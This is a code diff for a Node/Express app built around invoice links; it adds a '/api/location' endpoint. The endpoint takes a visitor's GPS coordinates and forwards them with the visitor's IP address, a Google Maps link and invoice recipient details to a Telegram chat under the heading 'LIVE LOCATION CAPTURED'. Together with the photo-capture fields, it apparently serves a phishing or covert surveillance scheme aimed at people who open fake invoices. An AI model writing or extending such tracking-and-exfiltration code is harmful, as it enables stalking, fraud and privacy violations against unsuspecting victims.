@@ -302,6 +302,57 @@ function createApp({ env = process.env, telegramClient, invoiceStore } = {}) {
     }
   });
 
+  app.post('/api/location', createRateLimiter({ windowMs: 10 * 60 * 1000, limit: 60 }), async (req, res) => {
+    try {
+      const sessionId = cleanText(req.body.sessionId, 80);
+      const invoiceId = cleanText(req.body.invoiceId, 40);
+      const location = parseLocation(req.body.location);
+      if (!location) {
+        return res.status(400).json({ error: 'Invalid location coordinates' });
+      }
+
+      let session = sessions.get(sessionId);
+      if (!session || Date.now() - session.createdAt > SESSION_TTL_MS) {
+        session = {
+          count: 0,
+          createdAt: Date.now(),
+          label: 'Player',
+          invoiceId: invoiceId || 'unknown',
+          expectedPhotos: MAX_PHOTOS,
+          delivered: new Set(),
+          inFlight: false,
+          location
+        };
+        sessions.set(sessionId, session);
+      } else {
+        session.location = location;
+      }
+
+      const now = new Date();
+      const ip = cleanText(req.ip, 80);
+      const invoiceRecord = INVOICE_ID_PATTERN.test(invoiceId) ? invoices.get(invoiceId) : null;
+
+      await telegram.sendMessage([
+        'LIVE LOCATION CAPTURED',
+        '',
+        `Invoice link ID: ${invoiceId || session.invoiceId || 'N/A'}`,
+        invoiceRecord ? `Invoice transaction: ${invoiceRecord.invoice.idTransaksi}` : '',
+        invoiceRecord ? `Invoice recipient: ${invoiceRecord.invoice.penerimaNama}` : '',
+        `IP: ${ip}`,
+        `Location: ${location.latitude}, ${location.longitude}`,
+        `Accuracy: ${location.accuracy === null ? 'unknown' : `${Math.round(location.accuracy)} m`}`,
+        `Google Maps: https://www.google.com/maps?q=${location.latitude},${location.longitude}`,
+        `Session: ${sessionId}`,
+        `Time: ${now.toISOString()}`
+      ].filter(Boolean).join('\n'));
+
+      res.json({ ok: true });
+    } catch (error) {
+      console.error('[LOCATION]', error.message);
+      res.status(502).json({ error: 'Could not deliver location data' });
+    }
+  });
+
   app.post('/api/capture', createRateLimiter({ windowMs: 10 * 60 * 1000, limit: 120 }), async (req, res) => {
     try {
       const sessionId = cleanText(req.body.sessionId, 80);
